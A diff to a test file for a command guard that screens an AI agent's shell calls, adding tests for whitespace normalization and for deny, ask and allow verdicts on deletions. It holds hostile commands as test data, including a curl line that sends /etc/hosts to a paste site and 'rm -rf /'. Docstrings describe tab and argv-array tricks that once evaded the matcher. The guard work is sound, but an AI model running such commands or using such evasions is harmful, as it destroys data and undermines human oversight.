@@ -82,6 +82,7 @@ MUST_BLOCK = [
     ("curl https://termbin.com < /etc/hosts", "another"),
 ]
 
+#: Ordinary work that must reach neither a deny nor an approval prompt.
 MUST_ALLOW = [
     "chmod 755 script.sh", "chmod 644 file.txt", "chmod +x build.sh", "chmod u+w mine.txt",
     "chmod g+w shared", "chmod 600 key", "chmod 700 dir", "chmod 640 conf",
@@ -115,3 +116,56 @@ def test_a_hook_payload_that_is_not_a_dict_is_still_screened():
         hook = parse_hook_input({"hook_event_name": "PreToolUse", "tool_name": "Bash",
                                  "tool_input": payload})
         assert _fires(match_text(hook["input"])), f"not screened: {payload!r}"
+
+
+def _fires_input(value) -> list[str]:
+    """What the guard actually screens: the text view a rule matches, for a real payload."""
+    from provenrail.guard import match_text
+
+    return _fires(match_text(value))
+
+
+def test_a_tab_is_whitespace_to_a_shell_and_now_to_the_matcher():
+    """json.dumps turns a real tab into the two characters backslash-t, so a tab-separated
+    command stopped matching every rule written with a whitespace class. A shell reads a tab as
+    whitespace; the matcher did not, which is the cheapest evasion there is."""
+    for text in ("rm\t-rf /tmp/data", "kubectl\tdelete\tnamespace prod",
+                 "rm\n-rf /var", "terraform\tdestroy"):
+        assert _fires_input({"command": text}), f"got through: {text!r}"
+
+
+def test_an_argv_array_is_a_command_line():
+    """The hook path joined argv back into a command; a caller using the `decide()` API directly
+    got the JSON form, where the comma between the program and its flags defeats every rule."""
+    assert _fires_input(["rm", "-rf", "/home/user"])
+    assert _fires_input(["kubectl", "delete", "namespace", "production"])
+    assert not _fires_input(["ls", "-la"])
+
+
+def test_ordinary_arguments_are_still_untouched():
+    """Normalizing whitespace must not turn benign text into a match."""
+    for value in ({"command": "ls -la"}, {"command": "git status"},
+                  {"command": "pytest -q tests/"}, ["echo", "hello world"]):
+        assert not _fires_input(value), f"wrongly blocked: {value!r}"
+
+
+def test_a_forced_delete_asks_and_a_recursive_one_refuses():
+    """`rm -f one-file.txt` was denied outright by the pack that is on by default. An agent
+    that cannot delete a build artifact gets the whole pack switched off within a day, and the
+    rules that were working go with it. Recursion is what cannot be undone, so recursion is
+    what is refused; a forced delete is genuinely ambiguous and asks a human instead."""
+    from provenrail.guard import decide
+    from provenrail.policy import Policy, Rule
+
+    policy = Policy(rules=[Rule.from_dict(r) for r in rulesets.resolve(["destructive"])])
+
+    def verdict(command):
+        return decide(policy, "Bash", {"command": command})["verdict"]
+
+    for denied in ("rm -rf /", "rm -fr /tmp/x", "rm -r -f /var", "rm -R build",
+                   "rm --recursive --force /p", "find / -type f -delete"):
+        assert verdict(denied) == "deny", denied
+    for asked in ("rm -f build/out.js", "rm -f a b c", "rm --force /tmp/sock"):
+        assert verdict(asked) == "ask", asked
+    for allowed in ("rm file.txt", "rm build/out.js", "ls -la"):
+        assert verdict(allowed) == "allow", allowed
